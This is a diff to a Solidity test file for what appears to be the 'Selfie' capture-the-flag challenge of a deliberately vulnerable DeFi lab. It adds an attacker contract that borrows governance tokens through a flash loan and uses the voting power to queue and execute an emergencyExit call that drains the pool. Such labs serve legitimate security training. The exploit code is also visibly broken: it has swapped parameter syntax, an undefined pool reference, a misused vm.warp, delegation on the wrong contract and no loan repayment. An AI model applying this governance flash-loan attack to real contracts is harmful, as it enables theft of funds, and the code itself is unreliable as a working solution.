@@ -7,6 +7,40 @@ import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
+contract Attacker is IERC3156FlashBorrower {
+    SimpleGovernance public governance;
+    address public recovery;
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
+
+    constructor(SimpleGovernance _governance, address _recovery){
+        governance = _governance;
+        recovery = _recovery;
+    }
+
+    function attack(pool SelfiePool, address token) external{
+        pool.flashLoan(address(this),address(token),TOKENS_IN_POOL,"");
+        console.log(token.balanceOf(address(this)));
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32){
+        governance.delegate(address(this));
+        uint256 actionId = governance.queueAction(address(pool),0,abi.encodeWithSelector(pool.emergencyExit.selector, recovery));
+        
+        vm.warp(block.timestamp + governance.getActionDelay() + 1);
+        governance.executeAction(actionId);
+
+        return CALLBACK_SUCCESS;
+        
+    }
+}
+
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -62,7 +96,8 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(address(governance),address(recovery));
+        attacker.attack(address(pool),address(token));
     }
 
     /**
